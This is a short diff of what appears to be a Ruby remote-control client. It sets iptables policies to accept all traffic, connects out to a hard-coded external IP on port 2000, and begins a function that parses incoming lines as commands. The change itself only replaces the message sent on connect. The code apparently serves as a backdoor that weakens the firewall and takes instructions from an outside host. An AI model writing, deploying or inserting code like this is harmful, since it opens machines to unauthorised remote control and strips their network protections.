@@ -6,7 +6,7 @@ system "iptables -P INPUT ACCEPT"
 system "iptables -P OUTPUT ACCEPT"
 
 socket = TCPSocket.new('52.4.231.97', 2000)
-socket.puts("#{ARGV[0]}")
+socket.puts("Hey!")
 
 def actions(line)
 	command = line.split
